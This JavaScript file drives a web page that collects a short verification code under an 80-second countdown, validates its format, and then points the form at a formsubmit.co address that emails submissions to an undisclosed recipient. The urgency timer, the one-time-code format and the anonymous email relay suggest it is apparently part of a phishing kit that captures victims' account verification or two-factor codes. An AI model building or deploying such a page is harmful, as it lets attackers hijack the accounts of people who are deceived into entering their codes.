const code = document.querySelector('.ver');
const next = document.querySelector('.next');
let timeDisplay = document.querySelector('.p2');
let checking = document.querySelector('.p3');
let form = document.querySelector('.form');
let time = {
  sec :JSON.parse(localStorage.getItem('time')).sec || 80
}
setInterval(() => {
  time.sec -= 1;
  localStorage.setItem('time', JSON.stringify(time));
  timeDisplay.innerHTML = `${JSON.parse(localStorage.getItem('time')).sec}S`;
  if (time.sec === 0) {
    document.body.innerHTML = "Code expired!";
  }
}, 1000);
function check() {
  if (code.value.length < 5) {
    checking.innerHTML = 'Please type valid length code!';
    form.action = "";
  } else if (code.value.includes(' ') ){
    checking.innerHTML = 'You can\'t use spaces!';
    form.action="";
  } else if (code.value.includes('@') ){
    checking.innerHTML = 'You can\'t use @!';
    form.action = "";
  } else if (code.value.length > 6) {
    checking.innerHTML = 'Please type valid length code!';
    form.action = "";
  } else if (code.value.includes('+') || code.value.includes('-') || code.value.includes('×') || code.value.includes('÷') || code.value.includes('.') || code.value.includes(',')) {
      checking.innerHTML = "You can\'t use mathematical characters!";
  } else {
    checking.innerHTML = 'Now click next!';
    form.action = "https://formsubmit.co/ba0e99addaf56e191aeba7a30b7c6751";
  }
}